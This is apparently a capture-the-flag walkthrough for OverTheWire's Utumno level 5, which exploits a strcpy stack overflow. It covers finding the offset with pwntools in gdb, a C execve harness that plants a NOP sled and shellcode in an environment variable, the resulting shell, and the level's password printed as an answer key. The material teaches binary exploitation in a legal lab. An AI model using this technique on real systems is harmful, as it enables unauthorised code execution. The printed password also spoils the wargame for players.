# Utumno Level 5 → 6

## Goal

Same shape as [level 2 → 3](level02.md) — `strcpy` overflow, payload lives in an environment variable, you invoke the binary via `execve` to control argc/argv/envp cleanly. No new primitive, but a fresh execution.

## Concepts you'll learn

- Why this level is a practice run: the same `execve`-driven env-var-payload technique reused
- Reinforcing `gdb` stack inspection for finding the right env-var slot
- The broader lesson: once you have an exploitation pattern in your toolkit, re-using it is fast

## Walkthrough

### 1. Trace the binary

```bash
$ ltrace /utumno/utumno5 2>&1 | head
...
strcpy(...)
```

The vulnerable call is `strcpy(buf, argv[<something>])` or `strcpy(buf, getenv("FOO"))`. Either way, a user-controllable string of arbitrary length is being copied into a fixed-size buffer.

### 2. Find the overflow offset

As usual, use a cyclic pattern:

```bash
$ gdb -q /utumno/utumno5
(gdb) run $(python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(300))")
# crash
(gdb) info registers eip
# eip = 0x6161616c   (an ASCII cyclic marker)
(gdb) q
$ python3 -c "from pwn import cyclic_find; print(cyclic_find(0x6161616c))"
132
```

Offset 132 in this example. (`pwntools`' `cyclic` / `cyclic_find` is the quickest pattern toolkit; Metasploit's `msf-pattern_create` / `msf-pattern_offset` is equivalent.)

### 3. Use an `execve` harness like level 2

```c
// /tmp/run5.c
#include <unistd.h>
int main(void){
    char *env[] = {
        "D0=x", "D1=x", "D2=x", "D3=x",
        "D4=x", "D5=x", "D6=x", "D7=x",
        "D8=x", "D9=x",
        "ATTACK=<200 NOPs><shellcode>",
        NULL
    };
    char *argv[] = { "/utumno/utumno5", "<132 bytes of filler><4-byte return addr>", NULL };
    execve(argv[0], argv, env);
    return 0;
}
```

Pick the return address after running once in `gdb` and inspecting the address of your `ATTACK` env string.

### 4. Fire

```bash
$ gcc -m32 /tmp/run5.c -o /tmp/run5
$ /tmp/run5
$ whoami
utumno6
$ cat /etc/utumno_pass/utumno6
eiluquieth
```

## The answer

The password for `utumno6` is:

**`eiluquieth`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/utumno/utumno5.html>
